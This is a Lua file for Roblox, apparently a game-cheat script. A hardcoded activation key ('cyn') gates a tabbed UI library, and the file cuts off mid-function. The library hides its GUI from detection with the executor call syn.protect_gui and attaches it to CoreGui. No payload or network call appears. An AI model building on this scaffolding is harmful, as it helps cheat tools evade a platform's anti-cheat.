local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(1, 1, 1)
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 20)
title.Position = UDim2.new(0, 0, 0, -20)
title.Text = "激活码系统"
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundColor3 = Color3.new(0, 0, 0)
title.Parent = frame

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

title.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
        dragInput = nil
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

local KeySystem = Instance.new("TextBox")
KeySystem.Size = UDim2.new(1, 0, 0.5, 0)
KeySystem.Position = UDim2.new(0, 0, 0, 0)
KeySystem.Text = "输入激活码"
KeySystem.TextColor3 = Color3.new(0, 0, 0)
KeySystem.BackgroundTransparency = 0.5
KeySystem.BackgroundColor3 = Color3.new(1, 1, 1)
KeySystem.TextWrapped = true
KeySystem.Parent = frame

local SubmitButton = Instance.new("TextButton")
SubmitButton.Size = UDim2.new(0.5, 0, 0.5, 0)
SubmitButton.Position = UDim2.new(0, 0, 0.5, 0)
SubmitButton.Text = "提交激活码"
SubmitButton.Parent = frame

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Position = UDim2.new(1, -20, 0, 0)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.BackgroundColor3 = Color3.new(1, 0, 0)
CloseButton.Parent = frame

CloseButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)
--------------------------------------------------------------------------
SubmitButton.MouseButton1Click:Connect(function()
    local KeySystem = KeySystem.Text
    if KeySystem == "cyn" then   
screenGui:Destroy()

 repeat task.wait() until game:IsLoaded()
local library = {}
local ToggleUI = false
library.currentTab = nil
library.flags = {}

local services = setmetatable({}, {
  __index = function(t, k)
    return game.GetService(game, k)
  end
})

local mouse = services.Players.LocalPlayer:GetMouse()

function Tween(obj, t, data)
	services.TweenService:Create(obj, TweenInfo.new(t[1], Enum.EasingStyle[t[2]], Enum.EasingDirection[t[3]]), data):Play()
	return true
end

function Ripple(obj)
	spawn(function()
		if obj.ClipsDescendants ~= true then
			obj.ClipsDescendants = true
		end
		local Ripple = Instance.new("ImageLabel")
		Ripple.Name = "Ripple"
		Ripple.Parent = obj
		Ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Ripple.BackgroundTransparency = 1.000
		Ripple.ZIndex = 8
		Ripple.Image = "rbxassetid://2708891598"
		Ripple.ImageTransparency = 0.800
		Ripple.ScaleType = Enum.ScaleType.Fit
		Ripple.ImageColor3 = Color3.fromRGB(255, 255, 255)
		Ripple.Position = UDim2.new((mouse.X - Ripple.AbsolutePosition.X) / obj.AbsoluteSize.X, 0, (mouse.Y - Ripple.AbsolutePosition.Y) / obj.AbsoluteSize.Y, 0)
		Tween(Ripple, {.3, 'Linear', 'InOut'}, {Position = UDim2.new(-5.5, 0, -5.5, 0), Size = UDim2.new(12, 0, 12, 0)})
		wait(0.15)
		Tween(Ripple, {.3, 'Linear', 'InOut'}, {ImageTransparency = 1})
		wait(.3)
		Ripple:Destroy()
	end)
end

local toggled = false

-- # Switch Tabs # --
local switchingTabs = false
function switchTab(new)
  if switchingTabs then return end
  local old = library.currentTab
  if old == nil then
    new[2].Visible = true
    library.currentTab = new
    services.TweenService:Create(new[1], TweenInfo.new(0.1), {ImageTransparency = 0}):Play()
    services.TweenService:Create(new[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()
    return
  end
  
  if old[1] == new[1] then return end
  switchingTabs = true
  library.currentTab = new

  services.TweenService:Create(old[1], TweenInfo.new(0.1), {ImageTransparency = 0.2}):Play()
  services.TweenService:Create(new[1], TweenInfo.new(0.1), {ImageTransparency = 0}):Play()
  services.TweenService:Create(old[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0.2}):Play()
  services.TweenService:Create(new[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()

  old[2].Visible = false
  new[2].Visible = true
  
  task.wait(0.1)

  switchingTabs = false
end

-- # Drag, Stolen from Kiriot or Wally # --
function drag(frame, hold)
	if not hold then
		hold = frame
	end
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end

	hold.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)

	services.UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

function library.new(library, name,theme)
    for _, v in next, services.CoreGui:GetChildren() do
        if v.Name == "frosty" then
          v:Destroy()
        end
      end
if theme == 'dark' then
    MainColor = Color3.fromRGB(25, 25, 25)
    Background = Color3.fromRGB(25, 25, 25)
    zyColor= Color3.fromRGB(25, 25, 25)
    beijingColor = Color3.fromRGB(25, 25, 25)
    else
    MainColor = Color3.fromRGB(25, 25, 25)
    Background = Color3.fromRGB(25, 25, 25)
    zyColor= Color3.fromRGB(30, 30, 30)
    beijingColor = Color3.fromRGB(255, 255, 255)
end
      local dogent = Instance.new("ScreenGui")
      local Main = Instance.new("Frame")
      local TabMain = Instance.new("Frame")
      local MainC = Instance.new("UICorner")
      local SB = Instance.new("Frame")
      local SBC = Instance.new("UICorner")
      local Side = Instance.new("Frame")
      local SideG = Instance.new("UIGradient")
      local TabBtns = Instance.new("ScrollingFrame")
      local TabBtnsL = Instance.new("UIListLayout")
      local ScriptTitle = Instance.new("TextLabel")
      local SBG = Instance.new("UIGradient") 
      local Open = Instance.new("TextButton")
      local UIG=Instance.new("UIGradient")
      local DropShadowHolder = Instance.new("Frame")
      local DropShadow = Instance.new("ImageLabel")
      local UICornerMain = Instance.new("UICorner")
      local UIGradient=Instance.new("UIGradient")
      local UIGradientTitle=Instance.new("UIGradient")
      
      if syn and syn.protect_gui then syn.protect_gui(dogent) end
    
      dogent.Name = "frosty"
      dogent.Parent = services.CoreGui
      
      function UiDestroy()
          dogent:Destroy()
      end
      
          function ToggleUILib()
            if not ToggleUI then
                dogent.Enabled = false
                ToggleUI = true
                else
                ToggleUI = false
                dogent.Enabled = true
            end
        end
      
      Main.Name = "Main"
      Main.Parent = dogent
      Main.AnchorPoint = Vector2.new(0.5, 0.5)
      Main.BackgroundColor3 = Background
      Main.BorderColor3 = MainColor
      Main.Position = UDim2.new(0.5, 0, 0.5, 0)
      Main.Size = UDim2.new(0, 572, 0, 353)
      Main.ZIndex = 1
      Main.Active = true
      Main.Draggable = true
      services.UserInputService.InputEnded:Connect(function(input)
      if input.KeyCode == Enum.KeyCode.LeftControl then
      if Main.Visible == true then
      Main.Visible = false else
      Main.Visible = true
      end
      end
      end)
      drag(Main)
      
      UICornerMain.Parent = Main
      UICornerMain.CornerRadius = UDim.new(0,3)
      
      DropShadowHolder.Name = "DropShadowHolder"
      DropShadowHolder.Parent = Main
      DropShadowHolder.BackgroundTransparency = 1.000
      DropShadowHolder.BorderSizePixel = 0
      DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
      DropShadowHolder.BorderColor3 = Color3.fromRGB(255,255,255)
      DropShadowHolder.ZIndex = 0

      DropShadow.Name = "DropShadow"
      DropShadow.Parent = DropShadowHolder
      DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
      DropShadow.BackgroundTransparency = 1.000
      DropShadow.BorderSizePixel = 0
      DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
      DropShadow.Size = UDim2.new(1, 43, 1, 43)
      DropShadow.ZIndex = 0
      DropShadow.Image = "rbxassetid://6015897843"
      DropShadow.ImageColor3 = Color3.fromRGB(255,255,255)
      DropShadow.ImageTransparency = 0.500
      DropShadow.ScaleType = Enum.ScaleType.Slice
      DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)


      UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.10, Color3.fromRGB(255, 127, 0)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.30, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(139, 0, 255)), ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(255, 127, 0)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 0))}
      UIGradient.Parent = DropShadow

      local TweenService = game:GetService("TweenService")
      local tweeninfo = TweenInfo.new(7, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
      local tween = TweenService:Create(UIGradient, tweeninfo, {Rotation = 360})
      tween:Play()

          function toggleui()
            toggled = not toggled
            spawn(function()
                if toggled then wait(0.3) end
            end)
            Tween(Main, {0.3, 'Sine', 'InOut'}, {
                Size = UDim2.new(0, 609, 0, (toggled and 505 or 0))
            })
        end
      
      TabMain.Name = "TabMain"
      TabMain.Parent = Main
      TabMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      TabMain.BackgroundTransparency = 1.000
      TabMain.Position = UDim2.new(0.217000037, 0, 0, 3)
      TabMain.Size = UDim2.new(0, 448, 0, 353)
      
      MainC.CornerRadius = UDim.new(0, 5.5)
      MainC.Name = "MainC"
      MainC.Parent = Frame
      
      SB.Name = "SB"
      SB.Parent = Main
      SB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      SB.BorderColor3 = MainColor
      SB.Size = UDim2.new(0, 8, 0, 353)
      
      SBC.CornerRadius = UDim.new(0, 6)
      SBC.Name = "SBC"
      SBC.Parent = SB
      
      Side.Name = "Side"
      Side.Parent = SB
      Side.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      Side.BorderColor3 = Color3.fromRGB(255, 255, 255)
      Side.BorderSizePixel = 0
      Side.ClipsDescendants = true
      Side.Position = UDim2.new(1, 0, 0, 0)
      Side.Size = UDim2.new(0, 110, 0, 353)
      
      SideG.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, zyColor), ColorSequenceKeypoint.new(1.00, zyColor)}
      SideG.Rotation = 90
      SideG.Name = "SideG"
      SideG.Parent = Side
      
      TabBtns.Name = "TabBtns"
      TabBtns.Parent = Side
      TabBtns.Active = true
      TabBtns.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      TabBtns.BackgroundTransparency = 1.000
      TabBtns.BorderSizePixel = 0
      TabBtns.Position = UDim2.new(0, 0, 0.0973535776, 0)
      TabBtns.Size = UDim2.new(0, 110, 0, 318)
      TabBtns.CanvasSize = UDim2.new(0, 0, 1, 0)
      TabBtns.ScrollBarThickness = 0
      
      TabBtnsL.Name = "TabBtnsL"
      TabBtnsL.Parent = TabBtns
      TabBtnsL.SortOrder = Enum.SortOrder.LayoutOrder
      TabBtnsL.Padding = UDim.new(0, 12)
      
      ScriptTitle.Name = "ScriptTitle"
      ScriptTitle.Parent = Side
      ScriptTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      ScriptTitle.BackgroundTransparency = 1.000
      ScriptTitle.Position = UDim2.new(0, 0, 0.00953488424, 0)
      ScriptTitle.Size = UDim2.new(0, 102, 0, 20)
      ScriptTitle.Font = Enum.Font.GothamSemibold
      ScriptTitle.Text = name
      ScriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
      ScriptTitle.TextSize = 14.000
      ScriptTitle.TextScaled = true
      ScriptTitle.TextXAlignment = Enum.TextXAlignment.Left
      
      UIGradientTitle.Parent = ScriptTitle
     
      local function NPLHKB_fake_script() 
        local script = Instance.new('LocalScript', ScriptTitle)
     
        local button = script.Parent
        local gradient = button.UIGradient
        local ts = game:GetService("TweenService")
        local ti = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
        local offset = {Offset = Vector2.new(1, 0)}
        local create = ts:Create(gradient, ti, offset)
        local startingPos = Vector2.new(-1, 0)
        local list = {} 
        local s, kpt = ColorSequence.new, ColorSequenceKeypoint.new
        local counter = 0
        local status = "down" 
        gradient.Offset = startingPos
        local function rainbowColors()
            local sat, val = 255, 255 
            for i = 1, 10 do 
                local hue = i * 17 
                table.insert(list, Color3.fromHSV(hue / 255, sat / 255, val / 255))
            end
        end
        rainbowColors()
        gradient.Color = s({
            kpt(0, list[#list]),
            kpt(0.5, list[#list - 1]),
            kpt(1, list[#list - 2])
        })
        counter = #list
        local function animate()
            create:Play()
            create.Completed:Wait() 
            gradient.Offset = startingPos 
            gradient.Rotation = 180
            if counter == #list - 1 and status == "down" then
                gradient.Color = s({
                    kpt(0, gradient.Color.Keypoints[1].Value),
                    kpt(0.5, list[#list]), 
                    kpt(1, list[1]) 
                })
                counter = 1
                status = "up" 
            elseif counter == #list and status == "down" then 
                gradient.Color = s({
                    kpt(0, gradient.Color.Keypoints[1].Value),
                    kpt(0.5, list[1]),
                    kpt(1, list[2])
                })
                counter = 2
                status = "up"
            elseif counter <= #list - 2 and status == "down" then 
                gradient.Color = s({
                    kpt(0, gradient.Color.Keypoints[1].Value),
                    kpt(0.5, list[counter + 1]), 
                    kpt(1, list[counter + 2])
                })
                counter = counter + 2
                status = "up"
            end
            create:Play()
            create.Completed:Wait()
            gradient.Offset = startingPos
            gradient.Rotation = 0 
            if counter == #list - 1 and status == "up" then
                gradient.Color = s({ 
     
                    kpt(0, list[1]), 
                    kpt(0.5, list[#list]), 
                    kpt(1, gradient.Color.Keypoints[3].Value)
                })
                counter = 1
                status = "down"
            elseif counter == #list and status == "up" then
                gradient.Color = s({
                    kpt(0, list[2]),
                    kpt(0.5, list[1]), 
                    kpt(1, gradient.Color.Keypoints[3].Value)
                })
                counter = 2
                status = "down"
            elseif counter <= #list - 2 and status == "up" then
                gradient.Color = s({
                    kpt(0, list[counter + 2]), 
                    kpt(0.5, list[counter + 1]), 
                    kpt(1, gradient.Color.Keypoints[3].Value) 	
                })
                counter = counter + 2
                status = "down"
            end
            animate()
        end
        animate()
     
    end
    coroutine.wrap(NPLHKB_fake_script)()
      
      SBG.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, zyColor), ColorSequenceKeypoint.new(1.00, zyColor)}
      SBG.Rotation = 90
      SBG.Name = "SBG"
      SBG.Parent = SB
    
      TabBtnsL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        TabBtns.CanvasSize = UDim2.new(0, 0, 0, TabBtnsL.AbsoluteContentSize.Y + 18)
      end)
      Open.Name = "Open"
      Open.Parent = dogent
      Open.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
      Open.Position = UDim2.new(0.00829315186, 0, 0.31107837, 0)
      Open.Size = UDim2.new(0, 61, 0, 32)
      Open.Font = Enum.Font.SourceSans
      Open.Text = "隐藏/打开"
      Open.TextColor3 = Color3.fromRGB(255, 255, 255)
      Open.TextSize = 14.000
      Open.Active = true
      Open.Draggable = true
      Open.MouseButton1Click:Connect(function()
      Main.Visible = not Main.Visible
      end)
      UIG.Parent = Open
      local window = {}
      function window.Tab(window, name, icon)
        local Tab = Instance.new("ScrollingFrame")
        local TabIco = Instance.new("ImageLabel")
        local TabText = Instance.new("TextLabel")
        local TabBtn = Instance.new("TextButton")
        local TabL = Instance.new("UIListLayout")
    
        Tab.Name = "Tab"
        Tab.Parent = TabMain
        Tab.Active = true
        Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Tab.BackgroundTransparency = 1.000
        Tab.Size = UDim2.new(1, 0, 1, 0)
        Tab.ScrollBarThickness = 2
        Tab.Visible = false
        
        TabIco.Name = "TabIco"
        TabIco.Parent = TabBtns
        TabIco.BackgroundTransparency = 1.000
        TabIco.BorderSizePixel = 0
        TabIco.Size = UDim2.new(0, 24, 0, 24)
        TabIco.Image = ("rbxassetid://%s"):format((icon or 4370341699))
        TabIco.ImageTransparency = 0.2
        
        TabText.Name = "TabText"
        TabText.Parent = TabIco
        TabText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabText.BackgroundTransparency = 1.000
        TabText.Position = UDim2.new(1.41666663, 0, 0, 0)
        TabText.Size = UDim2.new(0, 76, 0, 24)
        TabText.Font = Enum.Font.GothamSemibold
        TabText.Text = name
        TabText.TextColor3 = Color3.fromRGB(255, 255, 255)
        TabText.TextSize = 14.000
        TabText.TextXAlignment = Enum.TextXAlignment.Left
        TabText.TextTransparency = 0.2
        
        TabBtn.Name = "TabBtn"
        TabBtn.Parent = TabIco
        TabBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabBtn.BackgroundTransparency = 1.000
        TabBtn.BorderSizePixel = 0
        TabBtn.Size = UDim2.new(0, 110, 0, 24)
        TabBtn.AutoButtonColor = false
        TabBtn.Font = Enum.Font.SourceSans
        TabBtn.Text = ""
        TabBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        TabBtn.TextSize = 14.000
        
        TabL.Name = "TabL"
        TabL.Parent = Tab
        TabL.SortOrder = Enum.SortOrder.LayoutOrder
        TabL.Padding = UDim.new(0, 4)  
    
        TabBtn.MouseButton1Click:Connect(function()
            spawn(function()
                Ripple(TabBtn)
            end)
          switchTab({TabIco, Tab})
        end)
    
        if library.currentTab == nil then switchTab({TabIco, Tab}) end
    
        TabL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
          Tab.CanvasSize = UDim2.new(0, 0, 0, TabL.AbsoluteContentSize.Y + 8)
        end)
    
        local tab = {}
        function tab.section(tab, name, TabVal)
          local Section = Instance.new("Frame")
          local SectionC = Instance.new("UICorner")
          local SectionText = Instance.new("TextLabel")
          local SectionOpen = Instance.new("ImageLabel")
          local SectionOpened = Instance.new("ImageLabel")
          local SectionToggle = Instance.new("ImageButton")
          local Objs = Instance.new("Frame")
          local ObjsL = Instance.new("UIListLayout")
    
          Section.Name = "Section"
          Section.Parent = Tab
          Section.BackgroundColor3 = zyColor
          Section.BackgroundTransparency = 1.000
          Section.BorderSizePixel = 0
          Section.ClipsDescendants = true
          Section.Size = UDim2.new(0.981000006, 0, 0, 36)
          
          SectionC.CornerRadius = UDim.new(0, 6)
          SectionC.Name = "SectionC"
          SectionC.Parent = Section
          
          SectionText.Name = "SectionText"
          SectionText.Parent = Section
          SectionText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          SectionText.BackgroundTransparency = 1.000
          SectionText.Position = UDim2.new(0.0887396261, 0, 0, 0)
          SectionText.Size = UDim2.new(0, 401, 0, 36)
          SectionText.Font = Enum.Font.GothamSemibold
          SectionText.Text = name
          SectionText.TextColor3 = Color3.fromRGB(255, 255, 255)
          SectionText.TextSize = 16.000
          SectionText.TextXAlignment = Enum.TextXAlignment.Left
          
          SectionOpen.Name = "SectionOpen"
          SectionOpen.Parent = SectionText
          SectionOpen.BackgroundTransparency = 1
          SectionOpen.BorderSizePixel = 0
          SectionOpen.Position = UDim2.new(0, -33, 0, 5)
          SectionOpen.Size = UDim2.new(0, 26, 0, 26)
          SectionOpen.Image = "http://www.roblox.com/asset/?id=6031302934"
          
          SectionOpened.Name = "SectionOpened"
          SectionOpened.Parent = SectionOpen
          SectionOpened.BackgroundTransparency = 1.000
          SectionOpened.BorderSizePixel = 0
          SectionOpened.Size = UDim2.new(0, 26, 0, 26)
          SectionOpened.Image = "http://www.roblox.com/asset/?id=6031302932"
          SectionOpened.ImageTransparency = 1.000
    
          SectionToggle.Name = "SectionToggle"
          SectionToggle.Parent = SectionOpen
          SectionToggle.BackgroundTransparency = 1
          SectionToggle.BorderSizePixel = 0
          SectionToggle.Size = UDim2.new(0, 26, 0, 26)
          
          Objs.Name = "Objs"
          Objs.Parent = Section
          Objs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          Objs.BackgroundTransparency = 1
          Objs.BorderSizePixel = 0
          Objs.Position = UDim2.new(0, 6, 0, 36)
          Objs.Size = UDim2.new(0.986347735, 0, 0, 0)
    
          ObjsL.Name = "ObjsL"
          ObjsL.Parent = Objs
          ObjsL.SortOrder = Enum.SortOrder.LayoutOrder
          ObjsL.Padding = UDim.new(0, 8) 
          
          local open = TabVal
          if TabVal ~= false then
            Section.Size = UDim2.new(0.981000006, 0, 0, open and 36 + ObjsL.AbsoluteContentSize.Y + 8 or 36)
            SectionOpened.ImageTransparency = (open and 0 or 1)
            SectionOpen.ImageTransparency = (open and 1 or 0)
          end
          
          SectionToggle.MouseButton1Click:Connect(function()
            open = not open
            Section.Size = UDim2.new(0.981000006, 0, 0, open and 36 + ObjsL.AbsoluteContentSize.Y + 8 or 36)
            SectionOpened.ImageTransparency = (open and 0 or 1)
            SectionOpen.ImageTransparency = (open and 1 or 0)
          end)
    
          ObjsL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            if not open then return end
            Section.Size = UDim2.new(0.981000006, 0, 0, 36 + ObjsL.AbsoluteContentSize.Y + 8)
          end)
    
          local section = {}
          function section.Button(section, text, callback)
            local callback = callback or function() end
    
            local BtnModule = Instance.new("Frame")
            local Btn = Instance.new("TextButton")
            local BtnC = Instance.new("UICorner")    
            
            BtnModule.Name = "BtnModule"
            BtnModule.Parent = Objs
            BtnModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BtnModule.BackgroundTransparency = 1.000
            BtnModule.BorderSizePixel = 0
            BtnModule.Position = UDim2.new(0, 0, 0, 0)
            BtnModule.Size = UDim2.new(0, 428, 0, 38)
            
            Btn.Name = "Btn"
            Btn.Parent = BtnModule
            Btn.BackgroundColor3 = zyColor
            Btn.BorderSizePixel = 0
            Btn.Size = UDim2.new(0, 428, 0, 38)
            Btn.AutoButtonColor = false
            Btn.Font = Enum.Font.GothamSemibold
            Btn.Text = "   " .. text
            Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            Btn.TextSize = 16.000
            Btn.TextXAlignment = Enum.TextXAlignment.Left
            
            BtnC.CornerRadius = UDim.new(0, 6)
            BtnC.Name = "BtnC"
            BtnC.Parent = Btn
    
            Btn.MouseButton1Click:Connect(function()
                spawn(function()
                    Ripple(Btn)
                end)
                    spawn(callback)
                end)
            end
    
        function section:Label(text)
          local LabelModule = Instance.new("Frame")
          local TextLabel = Instance.new("TextLabel")
          local LabelC = Instance.new("UICorner")
          
          LabelModule.Name = "LabelModule"
          LabelModule.Parent = Objs
          LabelModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          LabelModule.BackgroundTransparency = 1.000
          LabelModule.BorderSizePixel = 0
          LabelModule.Position = UDim2.new(0, 0, NAN, 0)
          LabelModule.Size = UDim2.new(0, 428, 0, 19)
    
          TextLabel.Parent = LabelModule
          TextLabel.BackgroundColor3 = zyColor
          TextLabel.Size = UDim2.new(0, 428, 0, 22)
          TextLabel.Font = Enum.Font.GothamSemibold
          TextLabel.Text = text
          TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
          TextLabel.TextSize = 14.000
    
          LabelC.CornerRadius = UDim.new(0, 6)
          LabelC.Name = "LabelC"
          LabelC.Parent = TextLabel
          return TextLabel
        end
    
          function section.Toggle(section, text, flag, enabled, callback)
            local callback = callback or function() end
            local enabled = enabled or false
            assert(text, "No text provided")
            assert(flag, "No flag provided")
    
            library.flags[flag] = enabled
    
            local ToggleModule = Instance.new("Frame")
            local ToggleBtn = Instance.new("TextButton")
            local ToggleBtnC = Instance.new("UICorner")
            local ToggleDisable = Instance.new("Frame")
            local ToggleSwitch = Instance.new("Frame")
            local ToggleSwitchC = Instance.new("UICorner")
            local ToggleDisableC = Instance.new("UICorner")
            
            ToggleModule.Name = "ToggleModule"
            ToggleModule.Parent = Objs
            ToggleModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleModule.BackgroundTransparency = 1.000
            ToggleModule.BorderSizePixel = 0
            ToggleModule.Position = UDim2.new(0, 0, 0, 0)
            ToggleModule.Size = UDim2.new(0, 428, 0, 38)
            
            ToggleBtn.Name = "ToggleBtn"
            ToggleBtn.Parent = ToggleModule
            ToggleBtn.BackgroundColor3 = zyColor
            ToggleBtn.BorderSizePixel = 0
            ToggleBtn.Size = UDim2.new(0, 428, 0, 38)
            ToggleBtn.AutoButtonColor = false
            ToggleBtn.Font = Enum.Font.GothamSemibold
            ToggleBtn.Text = "   " .. text
            ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleBtn.TextSize = 16.000
            ToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
            
            ToggleBtnC.CornerRadius = UDim.new(0, 6)
            ToggleBtnC.Name = "ToggleBtnC"
            ToggleBtnC.Parent = ToggleBtn
            
            ToggleDisable.Name = "ToggleDisable"
            ToggleDisable.Parent = ToggleBtn
            ToggleDisable.BackgroundColor3 = Background
            ToggleDisable.BorderSizePixel = 0
            ToggleDisable.Position = UDim2.new(0.901869178, 0, 0.208881587, 0)
            ToggleDisable.Size = UDim2.new(0, 36, 0, 22)
            
            ToggleSwitch.Name = "ToggleSwitch"
            ToggleSwitch.Parent = ToggleDisable
            ToggleSwitch.BackgroundColor3 = beijingColor
            ToggleSwitch.Size = UDim2.new(0, 24, 0, 22)
            
            ToggleSwitchC.CornerRadius = UDim.new(0, 6)
            ToggleSwitchC.Name = "ToggleSwitchC"
            ToggleSwitchC.Parent = ToggleSwitch
            
            ToggleDisableC.CornerRadius = UDim.new(0, 6)
            ToggleDisableC.Name = "ToggleDisableC"
            ToggleDisableC.Parent = ToggleDisable        
    
            local funcs = {
              SetState = function(self, state)
                if state == nil then state = not library.flags[flag] end
                if library.flags[flag] == state then return end
                services.TweenService:Create(ToggleSwitch, TweenInfo.new(0.2), {Position = UDim2.new(0, (state and ToggleSwitch.Size.X.Offset / 2 or 0), 0, 0), BackgroundColor3 = (state and Color3.fromRGB(255, 255, 255) or beijingColor)}):Play()
                library.flags[flag] = state
                callback(state)
              end,
              Module = ToggleModule
            }
            
            if enabled ~= false then
                funcs:SetState(flag,true)
            end
    
            ToggleBtn.MouseButton1Click:Connect(function()
              funcs:SetState()
            end)
            return funcs
          end
    
          function section.Keybind(section, text, default, callback)
            local callback = callback or function() end
            assert(text, "No text provided")
            assert(default, "No default key provided")
    
            local default = (typeof(default) == "string" and Enum.KeyCode[default] or default)
            local banned = {
              Return = true;
              Space = true;
              Tab = true;
              Backquote = true;
              CapsLock = true;
              Escape = true;
              Unknown = true;
            }
            local shortNames = {
              RightControl = 'Right Ctrl',
              LeftControl = 'Left Ctrl',
              LeftShift = 'Left Shift',
              RightShift = 'Right Shift',
              Semicolon = ";",
              Quote = '"',
              LeftBracket = '[',
              RightBracket = ']',
              Equals = '=',
              Minus = '-',
              RightAlt = 'Right Alt',
              LeftAlt = 'Left Alt'
            }
    
            local bindKey = default
            local keyTxt = (default and (shortNames[default.Name] or default.Name) or "None")
    
            local KeybindModule = Instance.new("Frame")
            local KeybindBtn = Instance.new("TextButton")
            local KeybindBtnC = Instance.new("UICorner")
            local KeybindValue = Instance.new("TextButton")
            local KeybindValueC = Instance.new("UICorner")
            local KeybindL = Instance.new("UIListLayout")
            local UIPadding = Instance.new("UIPadding")
    
            KeybindModule.Name = "KeybindModule"
            KeybindModule.Parent = Objs
            KeybindModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            KeybindModule.BackgroundTransparency = 1.000
            KeybindModule.BorderSizePixel = 0
            KeybindModule.Position = UDim2.new(0, 0, 0, 0)
            KeybindModule.Size = UDim2.new(0, 428, 0, 38)
            
            KeybindBtn.Name = "KeybindBtn"
            KeybindBtn.Parent = KeybindModule
            KeybindBtn.BackgroundColor3 = zyColor
            KeybindBtn.BorderSizePixel = 0
            KeybindBtn.Size = UDim2.new(0, 428, 0, 38)
            KeybindBtn.AutoButtonColor = false
            KeybindBtn.Font = Enum.Font.GothamSemibold
            KeybindBtn.Text = "   " .. text
            KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            KeybindBtn.TextSize = 16.000
            KeybindBtn.TextXAlignment = Enum.TextXAlignment.Left
            
            KeybindBtnC.CornerRadius = UDim.new(0, 6)
            KeybindBtnC.Name = "KeybindBtnC"
            KeybindBtnC.Parent = KeybindBtn
            
            KeybindValue.Name = "KeybindValue"
